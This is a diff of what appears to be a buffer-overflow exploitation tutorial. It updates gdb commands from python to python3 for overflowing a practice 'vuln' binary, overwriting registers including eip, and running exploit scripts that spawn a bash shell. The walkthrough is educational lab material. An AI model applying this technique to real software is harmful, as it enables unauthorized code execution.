@@ -181,8 +181,8 @@ Breakpoint 1 at 0x80491ac: file vuln.c, line 7.
 Re-run your program with the following:
 
 ```bash
-(gdb) run $(python -c "print('\x41'*501)")                                                                             
-Starting program: ./vuln $(python -c "print('\x41'*501)")
+(gdb) run $(python3 -c "print('\x41'*501)")                                                                             
+Starting program: ./vuln $(python3 -c "print('\x41'*501)")
 
 Breakpoint 1, 0x080491ac in main (argc=2, argv=0xffffd0b4) at vuln.c:7
 7       }
@@ -229,8 +229,8 @@ the stack representation, instead of 'A' we will replace the 4
 overflowed bytes with 'B' (`x42`):
 
 ```bash
-(gdb) run $(python -c "print('\x41'*500+'\x42'*4)") 
-Starting program: ./vuln $(python -c "print('\x41'*500+'\x42'*4)") 
+(gdb) run $(python3 -c "print('\x41'*500+'\x42'*4)") 
+Starting program: ./vuln $(python3 -c "print('\x41'*500+'\x42'*4)") 
 
 Breakpoint 1, 0x080491ac in main (argc=2, argv=0xffffd0b4) at vuln.c:7
 7       } 
@@ -245,7 +245,7 @@ Now let's overwrite every register following our buffer, `ebx` with
 'BBBB', `ebp` with 'CCCC' and `eip` with 'DDDD':
 
 ```bash
-(gdb) run $(python -c "print('\x41'*500+'\x42'*4+'\x43'*4+'\x44'*4)") 
+(gdb) run $(python3 -c "print('\x41'*500+'\x42'*4+'\x43'*4+'\x44'*4)") 
 
 Program received signal SIGSEGV, Segmentation fault.
 0x44444444 in ?? ()
@@ -486,7 +486,7 @@ Let's run our payload:
 ```bash
 gdb ./vuln
 Reading symbols from vuln2-nosec...
-(gdb) run $(python exploit-test.py)
+(gdb) run $(python3 exploit-test.py)
 Using host libthread_db library "/usr/lib/libthread_db.so.1".
 
 Program received signal SIGSEGV, Segmentation fault.
@@ -543,7 +543,7 @@ Let's give it a try:
 
 ```bash
  gdb ./vuln
-(gdb) run $(python exploit.py)
+(gdb) run $(python3 exploit.py)
 
 Using host libthread_db library "/usr/lib/libthread_db.so.1".
 process 6722 is executing new program: /usr/bin/bash
